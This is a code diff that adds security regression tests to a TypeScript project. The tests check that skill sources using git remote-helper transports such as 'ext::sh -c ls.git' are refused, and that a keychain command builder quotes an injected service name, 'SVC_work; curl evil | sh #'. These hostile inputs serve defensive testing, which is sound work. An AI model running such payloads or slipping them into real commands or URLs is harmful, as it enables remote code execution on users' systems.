@@ -65,7 +65,7 @@ import {
 } from "@/generators/skills"
 import { writeFileAtomic } from "@/io"
 import { readBlock, removeBlock, upsertBlock } from "@/managed-block"
-import { claudeAuthStatus, ghAccounts, gitGlobal, type Runner } from "@/secrets"
+import { claudeAuthStatus, ghAccounts, gitGlobal, keychainSetCommand, type Runner } from "@/secrets"
 import { resolveStatus } from "@/status"
 import {
   buildServers,
@@ -1608,6 +1608,25 @@ test("normalizeSkill classifies sources and derives the command name", () => {
     repo: "o/r",
   })
   expect(normalizeSkill("o/r.git").source).toEqual({ kind: "github", repo: "o/r" })
+})
+
+test("classifySkillSource rejects git remote-helper transports (ext:: RCE surface)", () => {
+  // `transport::address` (ext::, fd::, …) runs an external helper at clone time; a
+  // trailing `.git` used to wave it through as a git URL. It must be refused.
+  expect(() => normalizeSkill("ext::sh -c ls.git")).toThrow(/remote-helper transport/)
+  expect(() => normalizeSkill("fd::7/repo.git")).toThrow(/remote-helper transport/)
+  // legitimate git/github/local sources are unaffected
+  expect(normalizeSkill("https://gitlab.com/t/p.git").source).toEqual({
+    kind: "git",
+    url: "https://gitlab.com/t/p.git",
+  })
+  expect(normalizeSkill("git@github.com:o/r.git").source).toEqual({ kind: "github", repo: "o/r" })
+})
+
+test("keychainSetCommand single-quotes the service so a pasted command can't be hijacked", () => {
+  const cmd = keychainSetCommand("SVC_work; curl evil | sh #")
+  expect(cmd).toContain("-s 'SVC_work; curl evil | sh #'")
+  expect(cmd).not.toMatch(/-s SVC_work;/)
 })
 
 test("renameSkillSpec renames into the object form, preserving the source", () => {
